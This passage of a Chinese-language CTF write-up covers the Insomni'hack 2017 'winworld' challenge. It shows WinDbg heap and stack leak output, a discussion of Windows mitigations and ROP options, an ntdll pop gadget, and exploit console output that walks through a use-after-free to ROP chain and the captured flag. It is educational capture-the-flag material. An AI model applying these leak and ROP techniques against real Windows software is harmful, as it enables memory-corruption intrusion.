    0:001> .for (r $t0 = 17c`262d0000; @$t0  3b`b6cfb000 & poi(@$t0)  dps winworld+1fbd0 L3
    00007ff7`9b9ffbd0 0000017c`2632ca8000007ff7`9b9ffbd8 0000017c`262da050
    00007ff7`9b9ffbe0 0000017c`2632cf20
好的！我们确实在默认堆上面找到了栈指针，并且我们能从winworld基址来泄漏堆中静态偏移的地址。
现在我们能浏览堆页，并且试图找到这些栈地址。在我的利用中为了简单，我使用了一个简单启发的方式来找到QWORDS在堆下面，但也高于100000000，交互式询问哪个可以作为栈泄漏。这明显可以改进。
**  
**
**0x08 缓解措施和ROP**
现在我们已经有任意写了并且能覆盖栈上面的RIP地址，剩下的就是构建ROP了。几个想法如下：
VirtualProtect，然后shellcode
加载SMB上面的库
执行一个shell命令（WinExec等）
完整的ROP来读取标记
正如早前提到的，二进制有一些最新的[缓解措施](https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088\(v=vs.85\).aspx)，在我们的上下文中是相关联的：
ProcessDynamicCodePolicy：阻止插入新的可执行内存，VirtualProtect将失败
ProcessSignaturePolicy：库必须被签名，组织了LoadLibrary
ProcessImageLoadPolicy：库不能从远程位置加载，组织了加载SMB上的库
最后两个选项依然可以用。我也想在父进程AppJailLauncher进程中添加一个使用PROC_THREAD_ATTRIBUTE_CHILD_PROCESS_POLICY的UpdateProcThreadAttribute的调用，将阻止winworld创建新进程，但是因为是一个控制台程序，winworld也会带起一个conhost.exe进程。使用这个缓解措施能阻止conhost.exe的创建，并且因此程序不能运行。
我的解决方案在ROP中直接读取。因为我不想陷入CreateFile和Windows句柄的麻烦中，我代替使用了ucrtbase.dll中的_sopen_s/_read/puts/_flushall函数。
在ntdll中查找小配件，我们能找到x64调用规则的pop前四个寄存器的完美的小配件。小配件在CFG中是它自己，这非常惊喜，可以进入rop链了。
    0:000> u ntdll+96470 L5
    ntdll!LdrpHandleInvalidUserCallTarget+0x70:
    00007ffa`89b16470 5a pop rdx
    00007ffa`89b16471 59 pop rcx
    00007ffa`89b16472 4158 pop r8
    00007ffa`89b16474 4159 pop r9
    00007ffa`89b16476 c3 ret
最终整合到一起：
        Z:aweinsomnihack2017winworld>python sploit.py getflag remote
        [+] Discovering the PRNG seed...
         Clock not synced with server...
        [+] Resynced clock, delay of -21 seconds
        [+] Found the maze center: (38, 41)
        [+] Check the map for people positions
        [+] Make sure that LFH is enabled for bucket of sizeof(Person)
        6 / 6 ...
        [+] Spray 0x100 std::string to force future initialization of pwnrobot->is_conscious
        256 / 256 ...
        [+] Cloning host, with uninitialized memory this one should have is_conscious...
        [+] Removing current friends of pwnrobot...
        [+] Moving a guest to the maze center (37, 86) -> (38, 41)...
        [+] Moving our host to the maze center (38, 29) -> (38, 41)...
        [+] pwnrobot should now be a human... kill him!
        [+] Removing all pwnrobot's friends...
        7 / 7 ...
        [+] Decrement the refcount of pwnrobot's human share_ptr to 0 -> free it
        [+] Spray 0x100 std::string to trigger UAF
        256 / 256 ...
        [+] heap leak: 0x18a6eae8b40
        [+] Leaking stack ptr...
        [+] Dumping heap @ 0x18a6eae6b40...
        [+] Dumping heap @ 0x18a6eae7b40...
        [HEAP] 0x18a6eae7b40
         [00] - 0x18a6ea96c72
         [01] - 0x18a6ea9c550
         [02] - 0x18a6ea9e6e0
        Use which qword as stack leak?
        [+] Dumping heap @ 0x18a6eae8b40...
        [HEAP] 0x18a6eae8b40
         [00] - 0x3ab7faf120
         [01] - 0x3ab7faf4f0
         [02] - 0x18a6ea9c550
         [03] - 0x18a6eae84c0
         [04] - 0x18a6eae8560
         [05] - 0x18a6eae8760
        Use which qword as stack leak? 1
        [+] stack @ 0x3ab7faf4f0
        [+] Leaking stack content...
        [-] Haven't found saved RIP on the stack. Increment stack pointer...
        [-] Haven't found saved RIP on the stack. Increment stack pointer...
        [-] Haven't found saved RIP on the stack. Increment stack pointer...
        RIP at offset 0x8
        [+] Overwrite stack with ROPchain...
        [+] Trigger ROP chain...
        Better not forget to initialize a robot's memory!Flag: INS{I pwn, therefore I am!}[+] Exploit completed.
**  
**
**0x09 总结**
你能在[
**这里**](https://github.com/Insomnihack/Teaser-2017/blob/master/winworld/exploit/sploit.py)
找到完整的利用。